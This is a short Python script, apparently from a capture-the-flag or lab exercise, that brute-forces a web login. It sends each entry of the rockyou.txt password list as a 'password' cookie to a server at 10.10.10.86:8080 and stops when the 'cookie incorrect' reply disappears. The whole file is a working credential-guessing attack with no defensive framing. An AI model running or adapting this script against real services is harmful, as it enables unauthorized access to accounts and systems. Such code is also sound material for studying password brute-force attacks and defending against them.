import urllib.request

url = "http://10.10.10.86:8080"
hdr = { 'Cookie' : 'password=asd' }

with open('/usr/share/wordlists/rockyou.txt',"r") as f:
    for line in f:
        hdr = {'Cookie':'password={}'.format(line).rstrip()}
        req = urllib.request.Request(url, headers=hdr)
        response = urllib.request.urlopen(req)
        resp = response.read().decode("utf-8")
        if(resp.find("cookie incorrect")>0):
            print('\r#Trying cookie: {}'.format(line))
        else:
            print("#MAYDAY MAYDAY! We got a match: {}".format(line))
            print("#HTTP Response:")
            print(resp)
            break
